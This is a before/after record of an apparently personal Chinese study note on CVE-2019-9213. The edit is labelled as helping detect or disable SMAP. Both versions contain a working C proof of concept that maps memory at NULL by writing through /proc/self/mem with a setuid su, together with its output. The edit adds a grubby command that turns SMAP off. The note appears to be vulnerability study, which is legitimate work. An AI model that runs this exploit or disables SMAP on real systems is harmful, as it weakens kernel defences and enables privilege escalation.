CVE-2019-9213.md, before:

## 关键代码

```c
===============================================================
user@deb10:~/stackexpand$ cat nullmap.c 
#include <sys/mman.h>
#include <err.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>

int main(void) {
  void *map = mmap((void*)0x10000, 0x1000, PROT_READ|PROT_WRITE,
                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
  if (map == MAP_FAILED) err(1, "mmap");
  int fd = open("/proc/self/mem", O_RDWR);
  if (fd == -1) err(1, "open");
  unsigned long addr = (unsigned long)map;
  while (addr != 0) {
    addr -= 0x1000;
    if (lseek(fd, addr, SEEK_SET) == -1) err(1, "lseek");
    char cmd[1000];
    sprintf(cmd, "LD_DEBUG=help su 1>&%d", fd);
    system(cmd);
  }
  system("head -n1 /proc/$PPID/maps");
  printf("data at NULL: 0x%lx\n", *(unsigned long *)0);
}
user@deb10:~/stackexpand$ gcc -o nullmap nullmap.c && ./nullmap 
00000000-00011000 rw-p 00000000 00:00 0 
data at NULL: 0x706f2064696c6156
user@deb10:~/stackexpand$ 
===============================================================
```

## 收获与积累
1. LD_DEBUG=help XXcommand (用作调试很有帮助)
2. 查看mmap_min_addr：
cat /proc/sys/vm/mmap_min_addr
3. 查看SMAP enabled or not：
cat /boot/config-4.15.0-29-generic | grep CONFIG_X86_SMAP


## 理解与思考
1. mmap映射奇怪参数组合（mmap_min_addr, fd=-1, flags=MAP_GROWSDOWN）可以映射成功。
2. 获取/proc/self/mem的句柄X后重定位文件指针，执行命令重定向STDOUT到X句柄，覆盖/proc/self/mem内容。
3. 循环执行2，直到文件指针为0。

思考：
1. 可否通过其他方式写入到/proc/self/mem？而不是调用命令
2. mmap映射的地址有什么要求？
3. 这个漏洞说是用户层绕过权限检查，搞清楚绕过原理。

Commit message:

Minor changes to help with detecting/disabling smap.

CVE-2019-9213.md, after:

## 关键代码

```c
===============================================================
user@deb10:~/stackexpand$ cat nullmap.c 
#include <sys/mman.h>
#include <err.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>

int main(void) {
  void *map = mmap((void*)0x10000, 0x1000, PROT_READ|PROT_WRITE,
                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
  if (map == MAP_FAILED) err(1, "mmap");
  int fd = open("/proc/self/mem", O_RDWR);
  if (fd == -1) err(1, "open");
  unsigned long addr = (unsigned long)map;
  while (addr != 0) {
    addr -= 0x1000;
    if (lseek(fd, addr, SEEK_SET) == -1) err(1, "lseek");
    char cmd[1000];
    sprintf(cmd, "LD_DEBUG=help su 1>&%d", fd);
    system(cmd);
  }
  system("head -n1 /proc/$PPID/maps");
  printf("data at NULL: 0x%lx\n", *(unsigned long *)0);
}
user@deb10:~/stackexpand$ gcc -o nullmap nullmap.c && ./nullmap 
00000000-00011000 rw-p 00000000 00:00 0 
data at NULL: 0x706f2064696c6156
user@deb10:~/stackexpand$ 
===============================================================
```

## 收获与积累
1. LD_DEBUG=help XXcommand (用作调试很有帮助)
2. 查看mmap_min_addr：
cat /proc/sys/vm/mmap_min_addr
3. 查看SMAP enabled or not：
cat /boot/config-4.15.0-29-generic | grep CONFIG_X86_SMAP
4. Check CPU support for SMAP
cat /proc/cpuinfo |grep -o smap
5. Check current status of SMAP on of kernel
cat /proc/cmdline |grep nosmap
6. Disable SMAP 
grubby --args="nosmap" --update-kernel=ALL


## 理解与思考
1. mmap映射奇怪参数组合（mmap_min_addr, fd=-1, flags=MAP_GROWSDOWN）可以映射成功。
2. 获取/proc/self/mem的句柄X后重定位文件指针，执行命令重定向STDOUT到X句柄，覆盖/proc/self/mem内容。
3. 循环执行2，直到文件指针为0。

思考：
1. 可否通过其他方式写入到/proc/self/mem？而不是调用命令
2. mmap映射的地址有什么要求？
3. 这个漏洞说是用户层绕过权限检查，搞清楚绕过原理。
